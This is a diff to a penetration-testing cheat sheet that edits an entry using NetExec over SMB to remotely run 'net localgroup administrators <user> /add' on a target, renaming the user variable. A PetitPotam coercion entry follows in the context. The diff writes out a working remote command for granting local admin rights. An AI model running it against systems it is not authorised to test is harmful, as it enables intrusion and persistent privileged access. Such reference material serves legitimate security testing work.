@@ -136,16 +136,17 @@ import nxc_auth
 
 ### Add user to local admin group
 
-Execute `net localgroup administrators /add` on the target to promote a domain user to local admin. Requires existing local admin on the target.
+Execute `net localgroup administrators /add` on the target to promote a target user to local admin. Requires existing local admin on the target; use a domain-qualified value such as `DOMAIN\user` when needed.
 
 ```sh title:"NetExec SMB net localgroup administrators /add via remote shell"
-nxc smb $domain -u $user $auth_flags -x 'net localgroup administrators $domain_user /add'
+nxc smb $domain -u $user $auth_flags -x 'net localgroup administrators $target_user /add'
 ```
 <!-- cheat
 import passwords
 import domain_ip
 import users
 import nxc_auth
+var target_user
 -->
 
 ### Coerce authentication via PetitPotam
